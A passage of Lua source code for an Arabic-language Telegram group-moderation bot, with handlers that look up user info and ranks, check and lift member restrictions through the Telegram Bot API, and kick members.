elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.first_name_ == false then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'☬︙ٱڵحسٱب محذوف\n', 1, 'md')
return false  end
if data.username_ == false then
Dev_Abs(msg.chat_id_, msg.id_, 1,'☬︙ٱسمه ↫ ❨ '..CatchName(data.first_name_,20)..' ❩\n☬︙ٱيـډيه ↫ ❨ '..result.sender_user_id_..' ❩'..photouser1..'\n☬︙رسٱئڵه ↫ ❨ '..user_msgs..' ❩\n☬︙تفٱعڵه ↫ ❨ '..formsgg(msguser)..' ❩\n☬︙ٱڵقيود ↫ ❨ '..Tkeed..' ❩\n☬︙ٱڵتوٱجد ↫ ❨ '..tt..' ❩\n☬︙ رتبته بٱڵكروب ↫ ❨ '..Renk..' ❩\n☬︙رتبته بٱڵبوت ↫ ❨ '..t..' ❩\n☬︙نوع حسٱبه ↫ ❨ '..noh..' ❩', 1, 'md')
else
text = '☬︙ٱسمه ↫ ❨ '..CatchName(data.first_name_,20)..
' ❩\n☬︙معرفه ↫ ❨ [@'..data.username_..']'..
' ❩\n☬︙ٱيـډيه ↫ ❨ '..result.sender_user_id_..
' ❩'..photouser1..
' ❩\n☬︙رسٱئڵه ↫ ❨ '..user_msgs..
' ❩\n☬︙تفٱعڵه ↫ ❨ '..formsgg(msguser)..
' ❩\n☬︙ٱڵقيود ↫ ❨ '..Tkeed..
' ❩\n☬︙ٱڵتوٱجد ↫ ❨ '..tt..
' ❩\n☬︙رتبته بٱڵكروب ↫ ❨ '..Renk..
' ❩\n☬︙رتبته بٱڵبوت ↫ ❨ '..t..' ❩'
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end
end,nil)
end,nil) 
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^كشف @(.*)') and Abbas_Abs(msg) or text and text:match('^ايدي @(.*)') and Abbas_Abs(msg) then 
local username = text:match('^كشف @(.*)') or text:match('^ايدي @(.*)')
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
local text = '☬︙*ٱڵمعرف غير صحيح*'
Dev_Abs(msg.chat_id_, msg.id_, 1,text, 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '☬︙نوع ٱڵحسٱب ↫ ❨ '..ch..' ❩\n☬︙ٱلٱيدي ↫ ❨ '..res.id_..' ❩\n☬︙ٱڵمعرف ↫ ❨ [@'..username..'] ❩\n☬︙ٱلٱسم ↫ ❨ '..res.title_..' ❩'
Dev_Abs(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '☬︙نوع ٱڵحسٱب ↫ ❨ '..gr..' ❩\n☬︙ٱلٱيدي ↫ ❨ '..res.id_..' ❩\n☬︙ٱڵمعرف ↫ ❨ [@'..username..'] ❩\n☬︙ٱلٱسم ↫ ❨ '..res.title_..' ❩'
Dev_Abs(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
if tonumber(res.id_) == tonumber(218385683) then
t = 'مبرمج ٱڵسورس'
elseif tonumber(res.id_) == tonumber(bot_id) then
t = 'هذٱ ٱڵبوت'
elseif tonumber(res.id_) == tonumber(DevId) then
t = 'مطۄر ٱسٱسي'
elseif DevAbs:sismember(DevProx..'abs:sudo3:',res.id_) then
t = 'مطۄر ثٱڵث'
elseif DevAbs:sismember(DevProx..'abs:monsh:'..msg.chat_id_,res.id_) then
t = 'منشئ ٱسٱسي'
elseif DevAbs:sismember(DevProx..'abs:monshid:'..msg.chat_id_,res.id_) then
t = 'منشئ'
elseif DevAbs:sismember(DevProx..'abs:owners:'..msg.chat_id_,res.id_) then
t = 'مدير'
elseif DevAbs:sismember(DevProx..'abs:admins:'..msg.chat_id_,res.id_) then
t = 'ٱدمن'
elseif DevAbs:sismember(DevProx..'abs:vipall:',res.id_) then
t = 'مميز عٱم'
elseif DevAbs:sismember(DevProx..'abs:adminall:',res.id_) then
t = 'ٱدمن عٱم'
elseif DevAbs:sismember(DevProx..'abs:ownerall:',res.id_) then
t = 'مدير عٱم'
elseif DevAbs:sismember(DevProx..'abs:vipmem:'..msg.chat_id_,res.id_) then
t = 'عضو مميز'
else
t = 'مجرد عضو'
end
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = res.id_},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = res.id_,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
if pho.total_count_ == 0 then
photouser1 = ''
else
photouser1 = '\n☬︙صوره ↫ ❨ '..pho.total_count_
end
local user_msgs = DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..data.id_) or 0
local msguser = tonumber(DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..data.id_))
if DevAbs:sismember(DevProx..'bot:gban:',res.id_) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(DevProx..'bot:banned:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevAbs:sismember(DevProx..'bot:muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(DevProx..'tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = ' لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'محظور'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.first_name_ == false then
Dev_Abs(msg.chat_id_, msg.id_, 1,'☬︙ٱڵحسٱب محذوف\n', 1, 'md')
return false  end
text = '☬︙ٱسمه ↫ ❨ '..CatchName(data.first_name_,20)..
' ❩\n☬︙معرفه ↫ ❨ [@'..data.username_..']'..
' ❩\n☬︙ٱيـډيه ↫ ❨ '..res.id_..
' ❩'..photouser1..
' ❩\n☬︙رسٱئڵه ↫ ❨ '..user_msgs..
' ❩\n☬︙تفٱعڵه ↫ ❨ '..formsgg(msguser)..
' ❩\n☬︙ٱڵقيود ↫ ❨ '..Tkeed..
' ❩\n☬︙ٱڵتوٱجد ↫ ❨ '..tt..
' ❩\n☬︙رتبته بٱڵكروب ↫ ❨ '..Renk..
' ❩\n☬︙رتبته بٱڵبوت ↫ ❨ '..t..' ❩'
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end,nil)
end,nil)
end,nil)
end 
end,nil)
return false 
end
if text and text:match('كشف (%d+)') and Abbas_Abs(msg) or text and text:match('ايدي (%d+)') and Abbas_Abs(msg) then 
local iduser = text:match('كشف (%d+)') or text:match('ايدي (%d+)')  
if tonumber(iduser) == tonumber(218385683) then
t = 'مبرمج ٱڵسورس'
elseif tonumber(iduser) == tonumber(bot_id) then
t = 'هذٱ ٱڵبوت'
elseif tonumber(iduser) == tonumber(DevId) then
t = 'مطۄر ٱسٱسي'
elseif DevAbs:sismember(DevProx..'abs:sudo3:',iduser) then
t = 'مطۄر ثٱڵث'
elseif DevAbs:sismember(DevProx..'abs:monsh:'..msg.chat_id_,iduser) then
t = 'منشئ ٱساسي'
elseif DevAbs:sismember(DevProx..'abs:monshid:'..msg.chat_id_,iduser) then
t = 'منشئ'
elseif DevAbs:sismember(DevProx..'abs:owners:'..msg.chat_id_,iduser) then
t = 'مدير'
elseif DevAbs:sismember(DevProx..'abs:admins:'..msg.chat_id_,iduser) then
t = 'ٱدمن'
elseif DevAbs:sismember(DevProx..'abs:vipall:',iduser) then
t = 'مميز عٱم'
elseif DevAbs:sismember(DevProx..'abs:adminall:',iduser) then
t = 'ٱدمن عٱم'
elseif DevAbs:sismember(DevProx..'abs:ownerall:',iduser) then
t = 'مدير عٱم'
elseif DevAbs:sismember(DevProx..'abs:vipmem:'..msg.chat_id_,iduser) then
t = 'عضو مميز'
else
t = 'مجرد عضو'
end
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = iduser},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = iduser,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Dev_Abs(msg.chat_id_, msg.id_, 1,'☬︙لٱٱستطيع ٱتمٱم ٱلٱمر', 1, 'md')
return false  end
if pho.total_count_ == 0 then
photouser = ''
else
photouser = '\n☬︙صوره ↫ ❨ '..pho.total_count_
end
if pho.total_count_ == 0 then 
photouser1 = ''
else
photouser1 = '\n☬︙صوره ↫ ❨ '..pho.total_count_
end
local user_msgs = DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..data.id_) or 0
if DevAbs:sismember(DevProx..'bot:gban:',iduser) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(DevProx..'bot:banned:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevAbs:sismember(DevProx..'bot:muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(DevProx..'tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = ' لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'محظور'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.first_name_ == false then
Dev_Abs(msg.chat_id_, msg.id_, 1,'☬︙ٱڵحسٱب محذوف\n', 1, 'md')
return false  end
if data.username_ == false then
Dev_Abs(msg.chat_id_, msg.id_, 1,'☬︙ٱسمه ↫ ❨ '..CatchName(data.first_name_,20)..' ❩\n☬︙ٱيـډيه ↫ ❨ '..iduser..' ❩'..photouser1..'\n☬︙رسٱئڵه ↫ ❨ '..user_msgs..' ❩\n☬︙تفٱعڵه ↫ ❨ '..formsgg(msguser)..' ❩\n☬︙ٱڵقيود ↫ ❨ '..Tkeed..' ❩\n☬︙ٱڵتوٱجد ↫ ❨ '..tt..' ❩\n☬︙ رتبته بٱڵكروب ↫ ❨ '..Renk..' ❩\n☬︙رتبته بٱڵبوت ↫ ❨ '..t..' ❩', 1, 'md')
else
text = '☬︙ٱسمه ↫ ❨ '..CatchName(data.first_name_,20)..
' ❩\n☬︙معرفه ↫ ❨ [@'..data.username_..']'..
' ❩\n☬︙ٱيـډيه ↫ ❨ '..iduser..
' ❩'..photouser1..
' ❩\n☬︙رسٱئڵه ↫ ❨ '..user_msgs..
' ❩\n☬︙تفٱعڵه ↫ ❨ '..formsgg(msguser)..
' ❩\n☬︙ٱڵقيود ↫ ❨ '..Tkeed..
' ❩\n☬︙ٱڵتوٱجد ↫ ❨ '..tt..
' ❩\n☬︙رتبته بٱڵكروب ↫ ❨ '..Renk..
' ❩\n☬︙رتبته بٱڵبوت ↫ ❨ '..t..' ❩'
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end
end,nil)
end,nil)
end,nil)
return false 
end 
--     Source DevProx     --
if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then 
function kshf_by_reply(extra, result, success)
if DevAbs:sismember(DevProx..'bot:muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevAbs:sismember(DevProx..'bot:banned:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevAbs:sismember(DevProx..'bot:gban:',result.sender_user_id_) then gban = 'محظور عام' else gban = 'غير محظور عام' end
if DevAbs:sismember(DevProx..'tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵحظر ٱڵعٱم ↫ '..gban..'\n☬︙ٱڵحظر ↫ '..banned..'\n☬︙ٱڵكتم ↫ '..muted..'\n☬︙ٱڵتقييد ↫ '..tkeed..'', 1, 'md')  
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^كشف القيود @(.*)') and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if DevAbs:sismember(DevProx..'bot:muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevAbs:sismember(DevProx..'bot:banned:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevAbs:sismember(DevProx..'bot:gban:',result.id_) then gban = 'محظور عام' else gban = 'غير محظور عام' end
if DevAbs:sismember(DevProx..'tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵحظر ٱڵعٱم ↫ '..gban..'\n☬︙ٱڵحظر ↫ '..banned..'\n☬︙ٱڵكتم ↫ '..muted..'\n☬︙ٱڵتقييد ↫ '..tkeed..'', 1, 'md')  
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱنٱ ٱڵبوت وڵيس ڵدي قيود* \n', 1, 'md')  
return false  end 
tdcli_function ({
ID = "GetUser",
user_id_ = result.sender_user_id_
},function(arg,data) 
if DevAbs:sismember(DevProx..'tkeed:'..msg.chat_id_,result.sender_user_id_) or DevAbs:sismember(DevProx..'bot:muted:'..msg.chat_id_,result.sender_user_id_) or DevAbs:sismember(DevProx..'bot:banned:'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then 
ABS_PROX = '☬︙ٱڵـعضو ↫ ❨ '..CatchName(data.first_name_,15)..' ❩\n☬︙تـۖم رفع قيوده بنجٱح \n ✓'   
absmoned(msg.chat_id_, result.sender_user_id_, msg.id_, ABS_PROX, 15, utf8.len(CatchName(data.first_name_,15))) 
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(DevProx..'tkeed:'..msg.chat_id_,result.sender_user_id_) 
DevAbs:srem(DevProx..'bot:banned:'..msg.chat_id_,result.sender_user_id_)   
DevAbs:srem(DevProx..'bot:muted:'..msg.chat_id_,result.sender_user_id_)   
else
ABS_PROX = '☬︙*ٱڵـعضو* ↫ ❨ [@'..data.username_..'] ❩\n☬︙*تـۖم رفع قيوده بنجٱح* \n ✓'   
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(DevProx..'tkeed:'..msg.chat_id_,result.sender_user_id_) 
DevAbs:srem(DevProx..'bot:banned:'..msg.chat_id_,result.sender_user_id_)   
DevAbs:srem(DevProx..'bot:muted:'..msg.chat_id_,result.sender_user_id_)   
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') 
end
else
if data.username_ == false then
ABS_PROX = '☬︙ٱڵـعضو ↫ ❨ '..CatchName(data.first_name_,15)..' ❩\n☬︙ڵيس ڵديه قيود ڵيتم رفعهٱ \n ✓'   
absmoned(msg.chat_id_, result.sender_user_id_, msg.id_, ABS_PROX, 15, utf8.len(CatchName(data.first_name_,15))) 
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(DevProx..'tkeed:'..msg.chat_id_,result.sender_user_id_) 
DevAbs:srem(DevProx..'bot:banned:'..msg.chat_id_,result.sender_user_id_)   
DevAbs:srem(DevProx..'bot:muted:'..msg.chat_id_,result.sender_user_id_)   
else
ABS_PROX = '☬︙*ٱڵـعضو* ↫ ❨ [@'..data.username_..'] ❩\n☬︙*ڵيس ڵديه قيود ڵيتم رفعهٱ* \n ✓'   
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(DevProx..'tkeed:'..msg.chat_id_,result.sender_user_id_) 
DevAbs:srem(DevProx..'bot:banned:'..msg.chat_id_,result.sender_user_id_)   
DevAbs:srem(DevProx..'bot:muted:'..msg.chat_id_,result.sender_user_id_)   
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') 
end
end
end,nil)   
end 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^رفع القيود (%d+)') and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then 
local user = text:match('رفع القيود (%d+)') 
if tonumber(user) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱنٱ ٱڵبوت وڵيس ڵدي قيود* \n', 1, 'md')  
return false  end 
tdcli_function ({
ID = "GetUser",
user_id_ = user
},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ڵم ٱستطع ٱستخرٱج ٱڵمعلومٱت* \n', 1, 'md') 
return false  end
if DevAbs:sismember(DevProx..'tkeed:'..msg.chat_id_,user) or DevAbs:sismember(DevProx..'bot:muted:'..msg.chat_id_,user) or DevAbs:sismember(DevProx..'bot:banned:'..msg.chat_id_,user) then
if data.username_ == false then
ABS_PROX = '☬︙ٱڵـعضو ↫ ❨ '..CatchName(data.first_name_,15)..' ❩\n☬︙تـۖم رفع قيوده بنجٱح \n ✓'   
absmoned(msg.chat_id_, user, msg.id_, ABS_PROX, 15, utf8.len(CatchName(data.first_name_,15)))  
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(DevProx..'tkeed:'..msg.chat_id_,user) 
DevAbs:srem(DevProx..'bot:banned:'..msg.chat_id_,user)   
DevAbs:srem(DevProx..'bot:muted:'..msg.chat_id_,user)   
else
ABS_PROX = '☬︙*ٱڵـعضو* ↫ ❨ [@'..data.username_..'] ❩\n☬︙*تـۖم رفع قيوده بنجٱح* \n ✓'   
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(DevProx..'tkeed:'..msg.chat_id_,user) 
DevAbs:srem(DevProx..'bot:banned:'..msg.chat_id_,user)   
DevAbs:srem(DevProx..'bot:muted:'..msg.chat_id_,user)   
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') 
end
else
if data.username_ == false then
ABS_PROX = '☬︙ٱڵـعضو ↫ ❨ '..CatchName(data.first_name_,15)..' ❩\n☬︙ڵيس ڵديه قيود ڵيتم رفعهٱ \n ✓'   
absmoned(msg.chat_id_, user, msg.id_, ABS_PROX, 15, utf8.len(CatchName(data.first_name_,15)))  
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(DevProx..'tkeed:'..msg.chat_id_,user) 
DevAbs:srem(DevProx..'bot:banned:'..msg.chat_id_,user)   
DevAbs:srem(DevProx..'bot:muted:'..msg.chat_id_,user)   
else
ABS_PROX = '☬︙*ٱڵـعضو* ↫ ❨ [@'..data.username_..'] ❩\n☬︙*ڵيس ڵديه قيود ڵيتم رفعهٱ* \n ✓'   
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(DevProx..'tkeed:'..msg.chat_id_,user) 
DevAbs:srem(DevProx..'bot:banned:'..msg.chat_id_,user)   
DevAbs:srem(DevProx..'bot:muted:'..msg.chat_id_,user)   
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') 
end
end
end,nil)  
end
if text and text:match('^رفع القيود @(.*)') and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then  
local username = text:match('رفع القيود @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')  
return false  end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*هذٱ معرف قنٱة وڵيس معرف حسٱب* \n', 1, 'md') 
return false  end
if tonumber(result.id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱنٱ ٱڵبوت وڵيس ڵدي قيود* \n', 1, 'md')  
return false  end 
tdcli_function ({
ID = "GetUser",
user_id_ = result.id_
},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ڵم ٱستطع ٱستخرٱج ٱڵمعلومٱت* \n', 1, 'md') 
return false  end
if DevAbs:sismember(DevProx..'tkeed:'..msg.chat_id_,result.id_) or DevAbs:sismember(DevProx..'bot:muted:'..msg.chat_id_,result.id_) or DevAbs:sismember(DevProx..'bot:banned:'..msg.chat_id_,result.id_) then
ABS_PROX = '☬︙*ٱڵـعضو* ↫ ❨ [@'..data.username_..'] ❩\n☬︙*تـۖم رفع قيوده بنجٱح* \n ✓'   
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(DevProx..'tkeed:'..msg.chat_id_,result.id_) 
DevAbs:srem(DevProx..'bot:banned:'..msg.chat_id_,result.id_)   
DevAbs:srem(DevProx..'bot:muted:'..msg.chat_id_,result.id_)   
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') 
else
ABS_PROX = '☬︙*ٱڵـعضو* ↫ ❨ [@'..data.username_..'] ❩\n☬︙*ڵيس ڵديه قيود ڵيتم رفعهٱ* \n ✓'   
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(DevProx..'tkeed:'..msg.chat_id_,result.id_) 
DevAbs:srem(DevProx..'bot:banned:'..msg.chat_id_,result.id_)   
DevAbs:srem(DevProx..'bot:muted:'..msg.chat_id_,result.id_)   
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') 
end
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
--     Source DevProx     --
if text and text:match("^رتبته @(.*)$") and Abbas_Abs(msg) then
local ap = {string.match(text, "^(رتبته) @(.*)$")}
function id_by_username(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(218385683) then
t = 'مبرمج ٱڵسورس'
elseif tonumber(result.id_) == tonumber(DevId) then
t = 'ٱڵمطۄر ٱلٱسٱسي'
elseif is_sudoid(result.id_) then
t = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(result.id_) then
t = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'ٱڵمنشئ ٱلٱسٱسي'
elseif is_monshid(result.id_, msg.chat_id_) then
t = 'ٱڵـۧمـۧنشئ'
elseif is_ownerall(result.id_) then
t = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(result.id_) then
t = 'ٱلٱدمن ٱڵعٱم'
elseif is_vipall(result.id_) then
t = 'ٱڵمميز ٱڵعٱم'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'مطي مرتب 😹💔'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'ٱڵـۧمـۧدير'
elseif is_admin(result.id_, msg.chat_id_) then
t = 'ٱلٱدمـۧن'
elseif result.id_ == bot_id then
t = 'هذٱ ٱنٱ ٱڵبۄت'
else
t = 'فقط عضو'
end
local gpid = tostring(result.id_)
if gpid:match('^(%d+)') then
text = '☬︙مُعرِفه ↫ ❨ @'..ap[2]..' ❩ \n☬︙رتـۧبتـۧه ↫ '..t
else
text = '☬︙ٱڵقنٱة ٱو ٱڵكروب ڵيس ڵه رتبه ' 
end
end
if not result.id_ then
text = '☬︙ٱڵمعرف غير صحيح'
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],id_by_username)
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^طرد$") and msg.reply_to_message_id_ ~= 0 and Abbas_Abs(msg) then
function kick_reply(extra, result, success)
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱ تستطيع ٱڵـطرد ٱو ٱڵـحظر \n☬︙لٱنة معطـۧڵ من قبل ٱڵمنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if not is_admin(result.sender_user_id_, result.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم طردة من ٱڵـمجموعة', 1, 'md')
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_,msg.reply_to_message_id_,kick_reply)
end
--     Source DevProx     --
if text and text:match("^طرد @(.*)$") and Abbas_Abs(msg) then
local ap = {string.match(text, "^(طرد) @(.*)$")}
function ban_by_username(extra, result, success)
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱ تستطيع ٱڵـطرد ٱو ٱڵـحظر \n☬︙لٱنة معطـۧڵ من قبل ٱڵمنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
if result.id_ then
if not is_admin(result.id_, msg.chat_id_) then
texts = '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم طردة من ٱڵـمجموعة'
chat_kick(msg.chat_id_, result.id_)
end
else
text = '☬︙*ٱڵمعرف غير صحيح*'
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],ban_by_username)
end
--     Source DevProx     --
if text and text:match("^طرد (%d+)$") and Abbas_Abs(msg) then
local ap = {string.match(text, "^(طرد) (%d+)$")}
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱ تستطيع ٱڵـطرد ٱو ٱڵـحظر \n☬︙لٱنة معطـۧڵ من قبل ٱڵمنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if not is_admin(ap[2], msg.chat_id_) then
chat_kick(msg.chat_id_, ap[2])
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم طردة من ٱڵـمجموعة', 1, 'md')
end end end
--     Source DevProx     --
if text and text:match("^قائمه المنع$") and Abbas_Abs(msg) then
local abs = (DevProx..'bot:filters:'..msg.chat_id_)
if abs then
